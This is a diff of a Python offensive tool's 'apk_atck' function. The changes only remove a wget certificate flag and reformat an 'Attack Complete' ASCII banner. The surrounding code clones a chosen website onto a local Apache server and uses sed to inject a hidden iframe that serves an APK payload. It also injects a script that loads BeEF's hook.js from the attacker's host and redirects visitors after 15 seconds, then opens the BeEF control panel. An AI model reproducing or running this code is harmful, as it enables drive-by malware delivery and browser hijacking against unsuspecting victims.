@@ -114,7 +114,7 @@ def apk_atck():
         else:
             pass
         subprocess.call(
-            'service apache2 start && cd /var/www/html/ && wget --no-check-certificate -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + URL_CLONE + '"',
+            'service apache2 start && cd /var/www/html/ && wget -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + URL_CLONE + '"',
             shell=True)
         subprocess.call(
             'sed -i \'s#</body>#<iframe id="frame" src="' + first_line + '" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\\n<script src="http://' + LHOST + ':3000/hook.js"></script>\\n<script type="text/javascript">setTimeout(function(){window.location.href="' + URL_CLONE + '";}, 15000);</script></body>#g\' /var/www/html/index.html',
@@ -173,15 +173,15 @@ def apk_atck():
         subprocess.call(
             'gnome-terminal --tab -e \'firefox -url ' + URL + ' -new-tab -url http://' + LAN + ':3000/ui/panel\'',
             shell=True)
-        print """ 
-                 _   _             _       _____                      _      _       
-            /\  | | | |           | |     / ____|                    | |    | |      
-           /  \ | |_| |_ __ _  ___| | __ | |     ___  _ __ ___  _ __ | | ___| |_ ___ 
-          / /\ \| __| __/ _` |/ __| |/ / | |    / _ \| '_ ` _ \| '_ \| |/ _ \ __/ _ \
-         / ____ \ |_| || (_| | (__|   <  | |___| (_) | | | | | | |_) | |  __/ ||  __/
-        /_/    \_\__|\__\__,_|\___|_|\_\  \_____\___/|_| |_| |_| .__/|_|\___|\__\___|
-                                                               | |                   
-                                                               |_|                   
+        print """
+             _   _             _       _____                      _      _
+        /\  | | | |           | |     / ____|                    | |    | |
+       /  \ | |_| |_ __ _  ___| | __ | |     ___  _ __ ___  _ __ | | ___| |_ ___
+      / /\ \| __| __/ _` |/ __| |/ / | |    / _ \| '_ ` _ \| '_ \| |/ _ \ __/ _ \
+     / ____ \ |_| || (_| | (__|   <  | |___| (_) | | | | | | |_) | |  __/ ||  __/
+    /_/    \_\__|\__\__,_|\___|_|\_\  \_____\___/|_| |_| |_| .__/|_|\___|\__\___|
+                                                               | |
+                                                               |_|
 """
         sys.exit()
 
@@ -244,7 +244,7 @@ def apk_atck():
         else:
             pass
         subprocess.call(
-            'service apache2 start && cd /var/www/html/ && wget --no-check-certificate -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + URL_CLONE + '"',
+            'service apache2 start && cd /var/www/html/ && wget -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + URL_CLONE + '"',
             shell=True)
         subprocess.call(
             'sed -i \'s#</body>#<iframe id="frame" src="' + first_line + '" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\\n<script src="http://' + LGHOST + ':' + LGPORT_BEEF + '/hook.js"></script>\\n<script type="text/javascript">setTimeout(function(){window.location.href="' + URL_CLONE + '";}, 15000);</script></body>#g\' /var/www/html/index.html',
